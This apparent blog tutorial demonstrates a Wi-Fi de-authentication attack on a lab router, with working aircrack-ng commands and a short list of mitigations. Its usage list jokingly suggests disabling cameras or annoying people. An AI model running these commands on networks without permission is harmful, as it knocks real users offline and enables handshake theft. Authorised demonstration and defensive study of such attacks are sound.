---
title: Wi-Fi De-Authentication Attack Demonstration
date: 2023-07-02T19:03:55.149Z
tags:
  - demo
  - informative
description: A supporting document for performing a Wi-Fi De-Authentication
  attack in a controlled environment.
---
<!--StartFragment-->

Hardware Pre-requisites. Specific to this example, any equivalent hardware will be fine.

* GL mango router
* Raspberry Pi with Wi-Fi capabilities
* Ethernet cable (for connecting the Pi an the mango)
* Laptop with a wireless interface device capable of sending de-authentication frames. This typically requires an external Wi-Fi adapter with specific chipset support, such as the Alfa AWUS036NHA ([Link](https://www.amazon.co.uk/Alfa-Network-AWUS036NHA-U-MOUNT-CS-DBi/dp/B01D064VMS/ref=asc_df_B01D064VMS/?tag=googshopuk-21&linkCode=df0&hvadid=310776295886&hvpos=&hvnetw=g&hvrand=8206363845483223267&hvpone=&hvptwo=&hvqmt=&hvdev=c&hvdvcmdl=&hvlocint=&hvlocphy=9045569&hvtargid=pla-563714733276&psc=1))

### Technical Overview

A Wi-Fi de-authentication attack is a type of denial of service attack that targets the 802.11 wireless protocol. The attack forces client devices to disconnect from a Wi-Fi network by sending forged de-authentication frames to a target device, which appear to be legitimate frames sent by the access point. The target device, having been disconnected from the network, will then try to re-authenticate with the access point, which can result in a repeated process of disconnections and reconnections. During this time, it is possible to capture the WPA2 authentication handshake between the device and the access point and retrieve the password hash for the access point. This hash can then be cracked offline and you can retrieve the plaintext password of the access point. This is out of scope for this demonstration but tools such as `Wifite` exist to perform this attack.

The de-authentication frame contains the MAC address of the access point and the client, along with a reason code indicating why the client device was de-authenticated from the network.

* MAC Address - A unique identifier assigned to a network interface controller

In this example, clients will connect to the GL mango router, which will be connected via ethernet cable to a Raspberry Pi, which will be hosting a basic demonstration web application. The demonstrator will instruct client to go to the address of the Raspberry Pi web application (DNS optional to facilitate this), then will perform a de-authentication attack on the GL router, forcing all of the clients to disconnect from the router. When the clients attempt to refresh the page being hosted on the Raspberry Pi, it will not work, as they are no longer on the network. Below is a network diagram which describes the hardware setup.

![](/img/diagram.png)

### Performing the De-Authentication Attack

Performing the de-authentication attack is very easy. First you must install the `aircrack-ng` suite. Also, ensure that the wireless adapter capable of packet injection is plugged into the attacking machine.

```shell
$ sudo apt-get install aircrack-ng # Install aircrack-ng suite
$ iwconfig # This will list wireless interfaces, check yours is there
# Put the interface into monitor mode
$ sudo airmon-ng start wlan1 6 # Syntax may vary -
# - Wlan1 is interface to use, use channel 6
# Dump information of nearby APs
$ sudo airodump-ng wlan1mon
```

![](/img/cmd-output.png)

The output of the `airodump-ng` command will look like this. The only bits you are interested in are `ESSID,` which is the SSID of the router / access point, and `BSSID` which is the corresponding MAC address. Make a note of the MAC address of the target AP. Take a note of the channel, sometimes the attack will error and that will help later, if it does.

```shell
# Assume target MAC of target AP is: aa:bb:cc:dd:ee:ff
# Perform the attack
$ sudo aireplay-ng -0 0 -a aa:bb:cc:dd:ee:ff wlan1mon
# All client devices will now be disconnected from the network.
```

In some cases, you may get an error such as:

* wlan1mon is on channel X, but the AP uses channel Y.

In this case, you can:

* Physically re-connect the adapter, and retry the attack.
* Run the following command and CTRL+C out of the output straight away

```shell
$ sudo airodump-ng wlan1mon --bssid aa:bb:cc:dd:ee:ff --channel <ROUTER_CHANNEL_HERE>
# This will switch the channel, you can know run the attack with no issue.
```

Below is a basic graphical representation of what the attack is doing.

![](/img/diagram-2.png)

### Usage

* To test security of wireless networks - checking that devices reconnect to the network securely.
* Red-teaming - sneaking into buildings, disable cameras (just a thought, maybe not practical)
* To annoy people

### Mitigations

1. “Management Frame Protection” was introduced by Cisco. In essence, the process adds a hash value to all management frames that are sent (like a checksum, to ensure validity and integrity). Widely adopted and implemented, but Apple still appears to be the holdout.
2. From the relevant WiFi standard:

   > “De-authentication is not a request; it is a notification. De-authentication shall not be refused by either party

   There is no real way to prevent such an attack. Faraday cages and tinfoil hats only!
3. Using a strong WiFi password (PSK) can prevent attacks wherein the handshake is captured and the password hash cracked.
4. Reduce signal strength - reduces range of attack for a de-authentication attack.

It is important to understand that performing a de-authentication attack on a network without permission is illegal and can result in criminal and civil penalties. It is important to ensure that you have explicit permission form the network owner before attempting any such demonstration. It is also essential to be aware of the laws and regulations in your jurisdiction relation to cyber security and network attacks.